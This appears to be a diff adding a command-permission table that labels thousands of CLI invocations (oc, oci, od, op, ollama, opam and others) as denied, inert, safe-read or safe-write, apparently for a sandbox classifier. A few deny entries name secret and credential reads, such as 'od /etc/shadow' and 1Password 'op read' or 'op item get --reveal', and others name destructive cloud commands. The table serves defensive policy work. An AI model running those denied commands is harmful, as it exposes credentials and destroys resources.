@@ -1,0 +1,2386 @@
+objdump	denied
+objdump --all-headers	inert
+objdump --all-headers --archive-headers	inert
+objdump --all-headers --demangle x	inert
+objdump --all-headers x	inert
+objdump --archive-headers	inert
+objdump --debugging	inert
+objdump --demangle x	inert
+objdump --disassemble	inert
+objdump --disassemble-all	inert
+objdump --disassemble-symbols x	inert
+objdump --dwarf x	inert
+objdump --dynamic-reloc	inert
+objdump --dynamic-syms	inert
+objdump --file-headers	inert
+objdump --full-contents	inert
+objdump --headers	inert
+objdump --help	inert
+objdump --info	inert
+objdump --line-numbers	inert
+objdump --no-addresses	inert
+objdump --no-show-raw-insn	inert
+objdump --private-headers	inert
+objdump --reloc	inert
+objdump --section x	inert
+objdump --section-headers	inert
+objdump --source	inert
+objdump --stabs	inert
+objdump --start-address x	inert
+objdump --stop-address x	inert
+objdump --syms	inert
+objdump --target x	inert
+objdump --version	inert
+objdump --wide	inert
+objdump -C	inert
+objdump -D	inert
+objdump -G	inert
+objdump -M x	inert
+objdump -R	inert
+objdump -S	inert
+objdump -T	inert
+objdump -V	inert
+objdump -W	inert
+objdump -a	inert
+objdump -b x	inert
+objdump -d	inert
+objdump -f	inert
+objdump -g	inert
+objdump -h	inert
+objdump -j x	inert
+objdump -l	inert
+objdump -m x	inert
+objdump -p	inert
+objdump -r	inert
+objdump -s	inert
+objdump -t	inert
+objdump -w	inert
+objdump -x	inert
+objdump x	inert
+oc	denied
+oc --help	inert
+oc --help --version	denied
+oc --help x	denied
+oc --version	inert
+oc -h	inert
+oc -v	inert
+oc adm	denied
+oc adm x	denied
+oc alpha	denied
+oc alpha x	denied
+oc annotate	denied
+oc annotate x	denied
+oc api-resources	denied
+oc api-resources x	denied
+oc api-versions	denied
+oc api-versions x	denied
+oc apply	denied
+oc apply x	denied
+oc auth	denied
+oc auth x	denied
+oc cluster-info	denied
+oc cluster-info x	denied
+oc completion	denied
+oc completion --help	inert
+oc completion --help -h	inert
+oc completion --help x	inert
+oc completion -h	inert
+oc completion x	inert
+oc config	denied
+oc config x	denied
+oc cp	denied
+oc cp x	denied
+oc create	denied
+oc create x	denied
+oc debug	denied
+oc debug x	denied
+oc delete	denied
+oc delete x	denied
+oc describe	denied
+oc describe --all-namespaces	safe-read
+oc describe --all-namespaces --context x	safe-read
+oc describe --all-namespaces --help	safe-read
+oc describe --all-namespaces x	safe-read
+oc describe --context x	safe-read
+oc describe --field-selector x	safe-read
+oc describe --filename x	safe-read
+oc describe --help	safe-read
+oc describe --kubeconfig x	safe-read
+oc describe --namespace x	safe-read
+oc describe --selector x	safe-read
+oc describe --show-events	safe-read
+oc describe -A	safe-read
+oc describe -f x	safe-read
+oc describe -h	safe-read
+oc describe -l x	safe-read
+oc describe -n x	safe-read
+oc describe x	safe-read
+oc diff	denied
+oc diff --context x	safe-read
+oc diff --filename x	safe-read
+oc diff --help	safe-read
+oc diff --help --context x	safe-read
+oc diff --help --recursive	safe-read
+oc diff --help x	safe-read
+oc diff --kubeconfig x	safe-read
+oc diff --namespace x	safe-read
+oc diff --recursive	safe-read
+oc diff --show-managed-fields	safe-read
+oc diff -R	safe-read
+oc diff -f x	safe-read
+oc diff -h	safe-read
+oc diff -n x	safe-read
+oc diff x	safe-read
+oc edit	denied
+oc edit x	denied
+oc events	safe-read
+oc events --all-namespaces	safe-read
+oc events --all-namespaces --context x	safe-read
+oc events --all-namespaces --help	safe-read
+oc events --all-namespaces x	safe-read
+oc events --context x	safe-read
+oc events --for x	safe-read
+oc events --help	safe-read
+oc events --kubeconfig x	safe-read
+oc events --namespace x	safe-read
+oc events --no-headers	safe-read
+oc events --output x	safe-read
+oc events --types x	safe-read
+oc events --watch	safe-read
+oc events -A	safe-read
+oc events -h	safe-read
+oc events -n x	safe-read
+oc events -o x	safe-read
+oc events -w	safe-read
+oc events x	safe-read
+oc exec	denied
+oc exec x	denied
+oc explain	denied
+oc explain --api-version x	safe-read
+oc explain --context x	safe-read
+oc explain --help	safe-read
+oc explain --help --api-version x	safe-read
+oc explain --help --recursive	safe-read
+oc explain --help x	safe-read
+oc explain --kubeconfig x	safe-read
+oc explain --output x	safe-read
+oc explain --recursive	safe-read
+oc explain -h	safe-read
+oc explain -o x	safe-read
+oc explain x	safe-read
+oc expose	denied
+oc expose x	denied
+oc extract	denied
+oc extract x	denied
+oc get	denied
+oc get --all-namespaces	safe-read
+oc get --all-namespaces --context x	safe-read
+oc get --all-namespaces --help	safe-read
+oc get --all-namespaces x	safe-read
+oc get --context x	safe-read
+oc get --field-selector x	safe-read
+oc get --help	safe-read
+oc get --kubeconfig x	safe-read
+oc get --namespace x	safe-read
+oc get --no-headers	safe-read
+oc get --output x	safe-read
+oc get --selector x	safe-read
+oc get --show-kind	safe-read
+oc get --show-labels	safe-read
+oc get --watch	safe-read
+oc get --watch-only	safe-read
+oc get -A	safe-read
+oc get -h	safe-read
+oc get -l x	safe-read
+oc get -n x	safe-read
+oc get -o x	safe-read
+oc get -w	safe-read
+oc get x	safe-read
+oc help	inert
+oc help x	inert
+oc image	denied
+oc image x	denied
+oc import-image	denied
+oc import-image x	denied
+oc kube-controller-manager	denied
+oc kube-controller-manager x	denied
+oc kustomize	denied
+oc kustomize x	denied
+oc label	denied
+oc label x	denied
+oc login	denied
+oc login x	denied
+oc logout	denied
+oc logout x	denied
+oc logs	denied
+oc logs --all-containers	safe-read
+oc logs --all-containers --container x	safe-read
+oc logs --all-containers --follow	safe-read
+oc logs --all-containers x	safe-read
+oc logs --container x	safe-read
+oc logs --context x	safe-read
+oc logs --follow	safe-read
+oc logs --help	safe-read
+oc logs --ignore-errors	safe-read
+oc logs --kubeconfig x	safe-read
+oc logs --limit-bytes x	safe-read
+oc logs --namespace x	safe-read
+oc logs --prefix	safe-read
+oc logs --previous	safe-read
+oc logs --since x	safe-read
+oc logs --since-time x	safe-read
+oc logs --tail x	safe-read
+oc logs --timestamps	safe-read
+oc logs -c x	safe-read
+oc logs -f	safe-read
+oc logs -h	safe-read
+oc logs -n x	safe-read
+oc logs -p	safe-read
+oc logs x	safe-read
+oc new-app	denied
+oc new-app x	denied
+oc new-build	denied
+oc new-build x	denied
+oc new-project	denied
+oc new-project x	denied
+oc options	denied
+oc options x	denied
+oc patch	denied
+oc patch x	denied
+oc plugin	denied
+oc plugin x	denied
+oc policy	denied
+oc policy x	denied
+oc port-forward	denied
+oc port-forward x	denied
+oc process	denied
+oc process x	denied
+oc project	denied
+oc project x	denied
+oc projects	denied
+oc projects x	denied
+oc registry	denied
+oc registry x	denied
+oc rollout	denied
+oc rollout x	denied
+oc rsh	denied
+oc rsh x	denied
+oc rsync	denied
+oc rsync x	denied
+oc run	denied
+oc run x	denied
+oc scale	denied
+oc scale x	denied
+oc secrets	denied
+oc secrets x	denied
+oc set	denied
+oc set x	denied
+oc status	safe-read
+oc status --all-namespaces	safe-read
+oc status --all-namespaces --help	safe-read
+oc status --all-namespaces --namespace x	safe-read
+oc status --all-namespaces x	safe-read
+oc status --help	safe-read
+oc status --namespace x	safe-read
+oc status --output x	safe-read
+oc status --suggest	safe-read
+oc status --verbose	safe-read
+oc status -A	safe-read
+oc status -h	safe-read
+oc status -n x	safe-read
+oc status -o x	safe-read
+oc status -v	safe-read
+oc status x	safe-read
+oc tag	denied
+oc tag x	denied
+oc top	denied
+oc top --all-namespaces	safe-read
+oc top --all-namespaces --containers	safe-read
+oc top --all-namespaces --context x	safe-read
+oc top --all-namespaces x	safe-read
+oc top --containers	safe-read
+oc top --context x	safe-read
+oc top --field-selector x	safe-read
+oc top --help	safe-read
+oc top --kubeconfig x	safe-read
+oc top --namespace x	safe-read
+oc top --no-headers	safe-read
+oc top --selector x	safe-read
+oc top --sort-by x	safe-read
+oc top --use-protocol-buffers	safe-read
+oc top -A	safe-read
+oc top -h	safe-read
+oc top -l x	safe-read
+oc top -n x	safe-read
+oc top x	safe-read
+oc version	inert
+oc version --client	inert
+oc version --client --help	inert
+oc version --client --output x	inert
+oc version --client x	inert
+oc version --help	inert
+oc version --output	inert
+oc version --output x	inert
+oc version --short	inert
+oc version -h	inert
+oc version -o	inert
+oc version -o x	inert
+oc version x	inert
+oc wait	denied
+oc wait x	denied
+oc whoami	safe-read
+oc whoami --help	safe-read
+oc whoami --help --show-context	safe-read
+oc whoami --help x	safe-read
+oc whoami --show-context	safe-read
+oc whoami --show-server	safe-read
+oc whoami --show-token	safe-read
+oc whoami -c	safe-read
+oc whoami -h	safe-read
+oc whoami -t	safe-read
+oc whoami x	safe-read
+oc x	denied
+ocamlformat	safe-read
+ocamlformat --check	safe-read
+ocamlformat --check --config x	safe-read
+ocamlformat --check --debug	safe-read
+ocamlformat --check x	safe-read
+ocamlformat --config x	safe-read
+ocamlformat --debug	safe-read
+ocamlformat --disable	safe-read
+ocamlformat --disable-conf-files	safe-read
+ocamlformat --disable-outside-detected-project	safe-read
+ocamlformat --doc-comments x	safe-read
+ocamlformat --doc-comments-padding x	safe-read
+ocamlformat --enable	safe-read
+ocamlformat --enable-outside-detected-project	safe-read
+ocamlformat --enable-outside-detected-project x	safe-read
+ocamlformat --exclude x	safe-read
+ocamlformat --help	safe-read
+ocamlformat --impl x	safe-read
+ocamlformat --include x	safe-read
+ocamlformat --inplace	safe-write
+ocamlformat --intf x	safe-read
+ocamlformat --margin x	safe-read
+ocamlformat --max-iters x	safe-read
+ocamlformat --name x	safe-read
+ocamlformat --no-version-check	safe-read
+ocamlformat --numeric	safe-read
+ocamlformat --ocaml-version x	safe-read
+ocamlformat --output x	safe-read
+ocamlformat --print-config	safe-read
+ocamlformat --print-margin-check	safe-read
+ocamlformat --profile x	safe-read
+ocamlformat --quiet	safe-read
+ocamlformat --root	safe-read
+ocamlformat --use-file x	safe-read
+ocamlformat --version	safe-read
+ocamlformat -c	safe-read
+ocamlformat -h	safe-read
+ocamlformat -i	safe-write
+ocamlformat x	safe-read
+oci	denied
+oci --auth x	denied
+oci --cert-bundle x	denied
+oci --cli-rc-file x	denied
+oci --config-file x	denied
+oci --debug	denied
+oci --debug --auth x	denied
+oci --debug --help	inert
+oci --debug x	denied
+oci --endpoint x	denied
+oci --help	inert
+oci --no-retry	denied
+oci --output x	denied
+oci --profile x	denied
+oci --query x	denied
+oci --region x	denied
+oci --request-id x	denied
+oci --version	inert
+oci -v	inert
+oci audit	denied
+oci audit event	denied
+oci audit event list	inert
+oci audit event x	denied
+oci audit x	denied
+oci budgets	denied
+oci budgets alert-rule	denied
+oci budgets alert-rule get	inert
+oci budgets alert-rule list	inert
+oci budgets alert-rule x	denied
+oci budgets budget	denied
+oci budgets budget get	inert
+oci budgets budget list	inert
+oci budgets budget x	denied
+oci budgets x	denied
+oci bv	denied
+oci bv boot-volume	denied
+oci bv boot-volume get	inert
+oci bv boot-volume list	inert
+oci bv boot-volume x	denied
+oci bv volume	denied
+oci bv volume get	inert
+oci bv volume list	inert
+oci bv volume list --compartment-id ocid1.compartment.oc1..aaa	inert
+oci bv volume x	denied
+oci bv volume-backup	denied
+oci bv volume-backup get	inert
+oci bv volume-backup list	inert
+oci bv volume-backup x	denied
+oci bv volume-group	denied
+oci bv volume-group get	inert
+oci bv volume-group list	inert
+oci bv volume-group x	denied
+oci bv x	denied
+oci compute	denied
+oci compute boot-volume-attachment	denied
+oci compute boot-volume-attachment get	inert
+oci compute boot-volume-attachment list	inert
+oci compute boot-volume-attachment x	denied
+oci compute image	denied
+oci compute image get	inert
+oci compute image list	inert
+oci compute image x	denied
+oci compute instance	denied
+oci compute instance get	inert
+oci compute instance get --instance-id ocid1.instance.oc1..aaa	inert
+oci compute instance launch --compartment-id X --shape Y --image-id Z --subnet-id S	denied
+oci compute instance list	inert
+oci compute instance list --compartment-id ocid1.compartment.oc1..aaa	inert
+oci compute instance terminate --instance-id X	denied
+oci compute instance x	denied
+oci compute shape	denied
+oci compute shape list	inert
+oci compute shape x	denied
+oci compute vnic-attachment	denied
+oci compute vnic-attachment get	inert
+oci compute vnic-attachment list	inert
+oci compute vnic-attachment x	denied
+oci compute x	denied
+oci db	denied
+oci db autonomous-database	denied
+oci db autonomous-database get	inert
+oci db autonomous-database list	inert
+oci db autonomous-database list --compartment-id ocid1.compartment.oc1..aaa	inert
+oci db autonomous-database x	denied
+oci db backup	denied
+oci db backup get	inert
+oci db backup list	inert
+oci db backup x	denied
+oci db database	denied
+oci db database get	inert
+oci db database list	inert
+oci db database x	denied
+oci db db-home	denied
+oci db db-home get	inert
+oci db db-home list	inert
+oci db db-home x	denied
+oci db db-node	denied
+oci db db-node get	inert
+oci db db-node list	inert
+oci db db-node x	denied
+oci db db-system	denied
+oci db db-system get	inert
+oci db db-system list	inert
+oci db db-system x	denied
+oci db x	denied
+oci fs	denied
+oci fs export	denied
+oci fs export get	inert
+oci fs export list	inert
+oci fs export x	denied
+oci fs file-system	denied
+oci fs file-system get	inert
+oci fs file-system list	inert
+oci fs file-system x	denied
+oci fs mount-target	denied
+oci fs mount-target get	inert
+oci fs mount-target list	inert
+oci fs mount-target x	denied
+oci fs snapshot	denied
+oci fs snapshot get	inert
+oci fs snapshot list	inert
+oci fs snapshot x	denied
+oci fs x	denied
+oci iam	denied
+oci iam availability-domain	denied
+oci iam availability-domain list	inert
+oci iam availability-domain x	denied
+oci iam compartment	denied
+oci iam compartment get	inert
+oci iam compartment list	inert
+oci iam compartment list --compartment-id ocid1.tenancy.oc1..aaa	inert
+oci iam compartment x	denied
+oci iam dynamic-group	denied
+oci iam dynamic-group get	inert
+oci iam dynamic-group list	inert
+oci iam dynamic-group x	denied
+oci iam fault-domain	denied
+oci iam fault-domain list	inert
+oci iam fault-domain x	denied
+oci iam group	denied
+oci iam group get	inert
+oci iam group list	inert
+oci iam group x	denied
+oci iam policy	denied
+oci iam policy get	inert
+oci iam policy list	inert
+oci iam policy x	denied
+oci iam region	denied
+oci iam region list	inert
+oci iam region x	denied
+oci iam tag	denied
+oci iam tag get	inert
+oci iam tag list	inert
+oci iam tag x	denied
+oci iam tag-namespace	denied
+oci iam tag-namespace get	inert
+oci iam tag-namespace list	inert
+oci iam tag-namespace x	denied
+oci iam user	denied
+oci iam user get	inert
+oci iam user list	inert
+oci iam user x	denied
+oci iam x	denied
+oci lb	denied
+oci lb backend	denied
+oci lb backend get	inert
+oci lb backend list	inert
+oci lb backend x	denied
+oci lb backend-set	denied
+oci lb backend-set get	inert
+oci lb backend-set list	inert
+oci lb backend-set x	denied
+oci lb certificate	denied
+oci lb certificate get	inert
+oci lb certificate list	inert
+oci lb certificate x	denied
+oci lb listener	denied
+oci lb listener get	inert
+oci lb listener list	inert
+oci lb listener x	denied
+oci lb load-balancer	denied
+oci lb load-balancer get	inert
+oci lb load-balancer list	inert
+oci lb load-balancer list --compartment-id ocid1.compartment.oc1..aaa	inert
+oci lb load-balancer x	denied
+oci lb x	denied
+oci limits	denied
+oci limits limit-definition	denied
+oci limits limit-definition list	inert
+oci limits limit-definition x	denied
+oci limits limit-value	denied
+oci limits limit-value list	inert
+oci limits limit-value x	denied
+oci limits resource-availability	denied
+oci limits resource-availability get	inert
+oci limits resource-availability x	denied
+oci limits service	denied
+oci limits service list	inert
+oci limits service x	denied
+oci limits x	denied
+oci logging	denied
+oci logging log	denied
+oci logging log get	inert
+oci logging log list	inert
+oci logging log x	denied
+oci logging log-group	denied
+oci logging log-group get	inert
+oci logging log-group list	inert
+oci logging log-group x	denied
+oci logging x	denied
+oci monitoring	denied
+oci monitoring alarm	denied
+oci monitoring alarm get	inert
+oci monitoring alarm list	inert
+oci monitoring alarm x	denied
+oci monitoring x	denied
+oci network	denied
+oci network drg	denied
+oci network drg get	inert
+oci network drg list	inert
+oci network drg x	denied
+oci network internet-gateway	denied
+oci network internet-gateway get	inert
+oci network internet-gateway list	inert
+oci network internet-gateway x	denied
+oci network nat-gateway	denied
+oci network nat-gateway get	inert
+oci network nat-gateway list	inert
+oci network nat-gateway x	denied
+oci network nsg	denied
+oci network nsg get	inert
+oci network nsg list	inert
+oci network nsg x	denied
+oci network public-ip	denied
+oci network public-ip get	inert
+oci network public-ip list	inert
+oci network public-ip x	denied
+oci network route-table	denied
+oci network route-table get	inert
+oci network route-table list	inert
+oci network route-table x	denied
+oci network security-list	denied
+oci network security-list get	inert
+oci network security-list list	inert
+oci network security-list x	denied
+oci network service-gateway	denied
+oci network service-gateway get	inert
+oci network service-gateway list	inert
+oci network service-gateway x	denied
+oci network subnet	denied
+oci network subnet get	inert
+oci network subnet list	inert
+oci network subnet x	denied
+oci network vcn	denied
+oci network vcn delete --vcn-id X	denied
+oci network vcn get	inert
+oci network vcn list	inert
+oci network vcn list --compartment-id ocid1.compartment.oc1..aaa	inert
+oci network vcn x	denied
+oci network x	denied
+oci os	denied
+oci os bucket	denied
+oci os bucket get	inert
+oci os bucket list	inert
+oci os bucket list --compartment-id ocid1.compartment.oc1..aaa --namespace-name n	inert
+oci os bucket x	denied
+oci os ns	denied
+oci os ns get	inert
+oci os ns x	denied
+oci os object	denied
+oci os object get --namespace-name n --bucket-name b --name f --file out	denied
+oci os object list	inert
+oci os object list --bucket-name b --namespace-name n	inert
+oci os object put --namespace-name n --bucket-name b --name f --file in	denied
+oci os object x	denied
+oci os preauth-request	denied
+oci os preauth-request get	inert
+oci os preauth-request list	inert
+oci os preauth-request x	denied
+oci os x	denied
+oci raw-request --http-method DELETE --target-uri https://api/x	denied
+oci raw-request --http-method GET --target-uri https://api/x	denied
+oci session authenticate	denied
+oci setup config	denied
+oci work-requests	denied
+oci work-requests work-request	denied
+oci work-requests work-request get	inert
+oci work-requests work-request list	inert
+oci work-requests work-request x	denied
+oci work-requests work-request-error	denied
+oci work-requests work-request-error list	inert
+oci work-requests work-request-error x	denied
+oci work-requests work-request-log-entry	denied
+oci work-requests work-request-log-entry list	inert
+oci work-requests work-request-log-entry x	denied
+oci work-requests x	denied
+oci x	denied
+ocsptool	denied
+ocsptool -!	inert
+ocsptool -! --ask x	inert
+ocsptool -! --generate-request	inert
+ocsptool -! x	inert
+ocsptool --ask x	inert
+ocsptool --attime x	inert
+ocsptool --debug x	inert
+ocsptool --generate-request	inert
+ocsptool --help	inert
+ocsptool --ignore-errors	inert
+ocsptool --inder	inert
+ocsptool --infile x	inert
+ocsptool --load-cert x	inert
+ocsptool --load-chain x	inert
+ocsptool --load-issuer x	inert
+ocsptool --load-request x	inert
+ocsptool --load-response x	inert
+ocsptool --load-signer x	inert
+ocsptool --load-trust x	inert
+ocsptool --more-help	inert
+ocsptool --no-inder	inert
+ocsptool --no-nonce	inert
+ocsptool --nonce	inert
+ocsptool --outder	inert
+ocsptool --outfile x	inert
+ocsptool --outpem	inert
+ocsptool --request-info	inert
+ocsptool --request-info --load-request req.der	inert
+ocsptool --response-info	inert
+ocsptool --verbose	inert
+ocsptool --verify-allow-broken	inert
+ocsptool --verify-response	inert
+ocsptool --version	inert
+ocsptool --version x	inert
+ocsptool -Q x	inert
+ocsptool -S x	inert
+ocsptool -V	inert
+ocsptool -d x	inert
+ocsptool -e	inert
+ocsptool -h	inert
+ocsptool -i	inert
+ocsptool -j	inert
+ocsptool -q	inert
+ocsptool -v x	inert
+ocsptool x	inert
+od	inert
+od --address-radix x	inert
+od --endian x	inert
+od --format x	inert
+od --help	inert
+od --help --address-radix x	inert
+od --help --output-duplicates	inert
+od --help x	inert
+od --output-duplicates	inert
+od --read-bytes x	inert
+od --skip-bytes x	inert
+od --strings x	inert
+od --traditional	inert
+od --version	inert
+od --width x	inert
+od -A x	inert
+od -N x	inert
+od -S x	inert
+od -V	inert
+od -b	inert
+od -c	inert
+od -d	inert
+od -f	inert
+od -h	inert
+od -i	inert
+od -j x	inert
+od -l	inert
+od -o	inert
+od -s	inert
+od -t x	inert
+od -v	inert
+od -w x	inert
+od -x	inert
+od -x file.bin	inert
+od ./file.bin	inert
+od ./x.bin	inert
+od /etc/shadow	denied
+od x	inert
+odbc_config	inert
+odbc_config --bin-prefix	inert
+odbc_config --bin-prefix --cflags	inert
+odbc_config --bin-prefix x	inert
+odbc_config --cflags	inert
+odbc_config --exec-prefix	inert
+odbc_config --header	inert
+odbc_config --help	denied
+odbc_config --include-prefix	inert
+odbc_config --lib-prefix	inert
+odbc_config --libs	inert
+odbc_config --libtool-libs	inert
+odbc_config --odbcini	inert
+odbc_config --odbcinstini	inert
+odbc_config --odbcversion	inert
+odbc_config --prefix	inert
+odbc_config --static-libs	inert
+odbc_config --ulen	inert
+odbc_config --version	inert
+odbc_config x	inert
+odbcinst	denied
+odbcinst --help	denied
+odbcinst --version	inert
+odbcinst --version -d	inert
+odbcinst --version -n x	inert
+odbcinst --version x	inert
+odbcinst -d	inert
+odbcinst -h	inert
+odbcinst -i -d -f drivers.ini	denied
+odbcinst -j	inert
+odbcinst -l	inert
+odbcinst -n x	inert
+odbcinst -q	inert
+odbcinst -q -d	inert
+odbcinst -q -s	inert
+odbcinst -s	inert
+odbcinst -v	inert
+odbcinst x	inert
+oha	denied
+oha --burst-delay x	safe-read
+oha --burst-rate x	safe-read
+oha --connect-to x	safe-read
+oha --debug	safe-read
+oha --debug --burst-delay x	safe-read
+oha --debug --disable-color	safe-read
+oha --debug x	safe-read
+oha --disable-color	safe-read
+oha --disable-compression	safe-read
+oha --disable-keepalive	safe-read
+oha --dns-resolver x	safe-read
+oha --dump-urls x	safe-read
+oha --exit-stage-key x	safe-read
+oha --help	safe-read
+oha --http2	safe-read
+oha --insecure	safe-read
+oha --ip-strategy x	safe-read
+oha --ipv4	safe-read
+oha --ipv6	safe-read
+oha --latency-correction	safe-read
+oha --max-redirects x	safe-read
+oha --method x	safe-read
+oha --no-tui	safe-read
+oha --output-format x	safe-read
+oha --proxy x	safe-read
+oha --proxy-http-version x	safe-read
+oha --proxy-password x	safe-read
+oha --proxy-username x	safe-read
+oha --rand-regex-url x	safe-read
+oha --reason-codes	safe-read
+oha --redirect x	safe-read
+oha --redirect-uri x	safe-read
+oha --reproduce-rng-seed x	safe-read
+oha --stats-success-breakdown	safe-read
+oha --timeout x	safe-read
+oha --unix-socket x	safe-read
+oha --use-mode	safe-read
+oha --user-agent x	safe-read
+oha --version	safe-read
+oha --wait-ongoing-requests-after-deadline x	safe-read
+oha -A	safe-read
+oha -A x	safe-read
+oha -D x	safe-read
+oha -H	safe-read
+oha -H x	safe-read
+oha -T x	safe-read
+oha -U x	safe-read
+oha -V	safe-read
+oha -a	safe-read
+oha -c	safe-read
+oha -c x	safe-read
+oha -d	safe-read
+oha -d x	safe-read
+oha -h	safe-read
+oha -m	safe-read
+oha -m x	safe-read
+oha -n	safe-read
+oha -n x	safe-read
+oha -q	safe-read
+oha -q x	safe-read
+oha -r	safe-read
+oha -r x	safe-read
+oha -t	safe-read
+oha -t x	safe-read
+oha -z	safe-read
+oha -z x	safe-read
+oha x	safe-read
+oid2name	inert
+oid2name --dbname x	inert
+oid2name --filenode x	inert
+oid2name --help	inert
+oid2name --help --dbname x	inert
+oid2name --help --indexes	inert
+oid2name --help x	inert
+oid2name --host x	inert
+oid2name --indexes	inert
+oid2name --oid x	inert
+oid2name --port x	inert
+oid2name --quiet	inert
+oid2name --system-objects	inert
+oid2name --tablename x	inert
+oid2name --tablespaces	inert
+oid2name --username x	inert
+oid2name --version	inert
+oid2name -?	inert
+oid2name -H x	inert
+oid2name -U x	inert
+oid2name -V	inert
+oid2name -d x	inert
+oid2name -f x	inert
+oid2name -i	inert
+oid2name -o x	inert
+oid2name -p x	inert
+oid2name -q	inert
+oid2name -s	inert
+oid2name -t x	inert
+oid2name -x	inert
+oid2name x	inert
+ollama	denied
+ollama --help	inert
+ollama --help --version	denied
+ollama --help x	denied
+ollama --version	inert
+ollama -V	inert
+ollama -h	inert
+ollama list	inert
+ollama list --help	inert
+ollama list --help --json	inert
+ollama list --help x	inert
+ollama list --json	inert
+ollama list -h	inert
+ollama list x	inert
+ollama ps	inert
+ollama ps --help	inert
+ollama ps --help --json	inert
+ollama ps --help x	inert
+ollama ps --json	inert
+ollama ps -h	inert
+ollama ps x	inert
+ollama show	denied
+ollama show --help	inert
+ollama show --help --json	inert
+ollama show --help x	inert
+ollama show --json	inert
+ollama show --license	inert
+ollama show --modelfile	inert
+ollama show --parameters	inert
+ollama show --system	inert
+ollama show --template	inert
+ollama show --verbose	inert
+ollama show -h	inert
+ollama show x	inert
+ollama x	denied
+op	denied
+op --help	inert
+op --help --version	denied
+op --help x	denied
+op --version	inert
+op -h	inert
+op -v	inert
+op account	inert
+op account get	inert
+op account get --account x	inert
+op account get --format x	inert
+op account get --help	inert
+op account get --help --account x	inert
+op account get --help -h	inert
+op account get --help x	inert
+op account get -h	inert
+op account get x	inert
+op account list	inert
+op account list --format	inert
+op account list --format --format x	inert
+op account list --format --help	inert
+op account list --format x	inert
+op account list --help	inert
+op account list -h	inert
+op account list x	inert
+op account x	denied
+op completion	denied
+op completion --help	inert
+op completion --help -h	inert
+op completion --help x	inert
+op completion -h	inert
+op completion x	inert
+op connect	denied
+op connect x	denied
+op device	denied
+op device x	denied
+op document	inert
+op document get	denied
+op document get --account x	denied
+op document get --force	denied
+op document get --force --account x	denied
+op document get --force --help	denied
+op document get --force x	denied
+op document get --help	denied
+op document get --include-archive x	denied
+op document get --out-file	denied
+op document get --out-file x	denied
+op document get --vault x	denied
+op document get -h	denied
+op document get x	denied
+op document list	inert
+op document list --account x	inert
+op document list --format x	inert
+op document list --help	inert
+op document list --help --account x	inert
+op document list --help --include-archive	inert
+op document list --help x	inert
+op document list --include-archive	inert
+op document list --vault x	inert
+op document list -h	inert
+op document list x	inert
+op document x	denied
+op encode	denied
+op encode x	denied
+op events-api	denied
+op events-api x	denied
+op group	inert
+op group get	inert
+op group get --account x	inert
+op group get --format x	inert
+op group get --help	inert
+op group get --help --account x	inert
+op group get --help -h	inert
+op group get --help x	inert
+op group get -h	inert
+op group get x	inert
+op group list	inert
+op group list --account x	inert
+op group list --format x	inert
+op group list --help	inert
+op group list --help --account x	inert
+op group list --help -h	inert
+op group list --help x	inert
+op group list --user x	inert
+op group list --vault x	inert
+op group list -h	inert
+op group list x	inert
+op group list-groups	inert
+op group list-groups --help	inert
+op group list-groups --help -h	inert
+op group list-groups --help x	inert
+op group list-groups -h	inert
+op group list-groups x	inert
+op group list-users	inert
+op group list-users --help	inert
+op group list-users --help -h	inert
+op group list-users --help x	inert
+op group list-users -h	inert
+op group list-users x	inert
+op group x	denied
+op help	inert
+op help x	inert
+op inject	denied
+op inject x	denied
+op item	inert
+op item get	denied
+op item get --account x	denied
+op item get --fields x	denied
+op item get --format x	denied
+op item get --help	denied
+op item get --help --account x	denied
+op item get --help -h	denied
+op item get --help x	denied
+op item get --otp x	denied
+op item get --reveal x	denied
+op item get --vault x	denied
+op item get -h	denied
+op item get x	denied
+op item list	inert
+op item list --account x	inert
+op item list --categories x	inert
+op item list --favorite x	inert
+op item list --format x	inert
+op item list --help	inert
+op item list --help --account x	inert
+op item list --help --include-archive	inert
+op item list --help x	inert
+op item list --include-archive	inert
+op item list --include-archive x	inert
+op item list --long x	inert
+op item list --tags x	inert
+op item list --vault x	inert
+op item list -h	inert
+op item list x	inert
+op item template	inert
+op item template --account x	inert
+op item template --format x	inert
+op item template --help	inert
+op item template --help --account x	inert
+op item template --help -h	inert
+op item template --help x	inert
+op item template -h	inert
+op item template x	inert
+op item x	denied
+op plugin	denied
+op plugin x	denied
+op read	denied
+op read --account x	denied
+op read --force	denied
+op read --force --account x	denied
+op read --force --help	denied
+op read --force x	denied
+op read --help	denied
+op read --no-newline	denied
+op read --out-file	denied
+op read --out-file x	denied
+op read -h	denied
+op read -n	denied
+op read x	denied
+op run	denied
+op run x	denied
+op service-account	denied
+op service-account x	denied
+op signin	denied
+op signin x	denied
+op signout	denied
+op signout x	denied
+op ssh	denied
+op ssh x	denied
+op user	inert
+op user get	inert
+op user get --account x	inert
+op user get --fingerprint x	inert
+op user get --format x	inert
+op user get --help	inert
+op user get --help --account x	inert
+op user get --help --me	inert
+op user get --help x	inert
+op user get --me	inert
+op user get --public-key x	inert
+op user get -h	inert
+op user get x	inert
+op user list	inert
+op user list --account x	inert
+op user list --format x	inert
+op user list --group x	inert
+op user list --help	inert
+op user list --help --account x	inert
+op user list --help -h	inert
+op user list --help x	inert
+op user list --vault x	inert
+op user list -h	inert
+op user list x	inert
+op user x	denied
+op vault	inert
+op vault get	inert
+op vault get --account x	inert
+op vault get --format x	inert
+op vault get --help	inert
+op vault get --help --account x	inert
+op vault get --help -h	inert
+op vault get --help x	inert
+op vault get -h	inert
+op vault get x	inert
+op vault list	inert
+op vault list --account x	inert
+op vault list --format x	inert
+op vault list --group x	inert
+op vault list --help	inert
+op vault list --help --account x	inert
+op vault list --help -h	inert
+op vault list --help x	inert
+op vault list --user x	inert
+op vault list -h	inert
+op vault list x	inert
+op vault list-groups	inert
+op vault list-groups --help	inert
+op vault list-groups --help -h	inert
+op vault list-groups --help x	inert
+op vault list-groups -h	inert
+op vault list-groups x	inert
+op vault list-users	inert
+op vault list-users --help	inert
+op vault list-users --help -h	inert
+op vault list-users --help x	inert
+op vault list-users -h	inert
+op vault list-users x	inert
+op vault x	denied
+op version	inert
+op version --help	inert
+op version --help -h	inert
+op version --help x	inert
+op version -h	inert
+op version x	inert
+op whoami	safe-read
+op whoami --account x	safe-read
+op whoami --format x	safe-read
+op whoami --help	safe-read
+op whoami --help --account x	safe-read
+op whoami --help -h	safe-read
+op whoami --help x	safe-read
+op whoami -h	safe-read
+op whoami x	safe-read
+op x	denied
+opam	denied
+opam --help	inert
+opam --help --version	denied
+opam --help x	denied
+opam --version	inert
+opam -h	inert
+opam admin	denied
+opam admin x	denied
+opam clean	denied
+opam clean x	denied
+opam config	denied
+opam config x	denied
+opam env	safe-read
+opam env --csh	safe-read
